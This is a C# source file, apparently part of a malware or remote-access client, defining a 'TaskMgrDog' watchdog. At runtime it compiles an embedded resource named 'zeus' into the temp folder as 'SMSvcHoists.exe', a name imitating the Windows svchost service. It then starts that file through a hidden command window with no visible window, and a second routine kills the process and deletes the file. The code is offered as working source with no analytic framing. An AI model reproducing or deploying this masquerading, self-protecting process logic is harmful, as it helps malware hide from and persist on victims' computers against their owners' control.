using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Helper
{
    internal class TaskMgrDog
    {
        #region TheWatcher
        private static readonly string[] referencedAssemblies = new string[]
        {
            "System.dll",
            "System.Management.dll",
            "System.Windows.Forms.dll",
            "System.Drawing.dll",
            "Microsoft.VisualBasic.dll",
            "System.Reflection.dll",
            "System.Threading.dll",
            "System.Threading.Tasks.dll",
            "System.Security.Principal.dll"
        };
        public static void TaskMgrDogStart()
        {
            string pathm = Path.GetTempPath();
            CompilerParameters Params = new CompilerParameters(referencedAssemblies);
            Params.IncludeDebugInformation = false;
            Params.CompilerOptions = " /target:winexe /platform:anycpu /optimize+";
            Params.OutputAssembly = Path.Combine(pathm, "SMSvcHoists.exe");
            string Source = Plugin.Properties.Resources.zeus;
            string path = Process.GetCurrentProcess().MainModule.FileName;
            Process currentProcess = Process.GetCurrentProcess();
            string pid = currentProcess.Id.ToString();
            Source = Source.Replace("%NAME%", System.Diagnostics.Process.GetCurrentProcess().ProcessName)
            .Replace("%PATH%", path)
            .Replace("%PID%", pid);
            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");
            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);
            foreach (CompilerError Error in Results.Errors)
                MessageBox.Show(Error.ToString());
            if (Information.UBound(Process.GetProcessesByName("SMSvcHoists")) < 0)
            {
                new Thread(() =>
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/k start /b " + Path.Combine(pathm, "SMSvcHoists.exe" + "  & exit"),
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                }).Start();
            }



        }
        public static void TaskMgrDogStop()
        {
            try
            {
                foreach (Process proc in Process.GetProcessesByName("SMSvcHoists"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("smsvchoists"))
                {
                    proc.Kill();
                }
                string pathm = Path.GetTempPath();
                File.Delete(Path.Combine(pathm, "SMSvcHoists.exe"));
            }
            catch
            {
                //MessageBox.Show(ex.Message);
            }

        }
        #endregion
 
    }
}
